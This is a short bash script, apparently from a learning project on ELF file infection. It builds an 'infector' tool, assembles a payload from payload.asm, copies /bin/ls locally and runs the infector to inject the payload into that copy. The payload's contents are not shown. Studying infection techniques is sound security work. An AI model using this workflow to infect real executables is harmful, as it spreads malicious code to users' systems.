#!/bin/bash


# Compiling executables 
cmake -G"Unix Makefiles"
make

# Compiling assembly payload
nasm -f elf64 -o payload.o payload.asm
ld -o payload payload.o

# Copying ls to current directory

cp /bin/ls .

# Infecting ls using our payload

./infector -p ls payload out_file
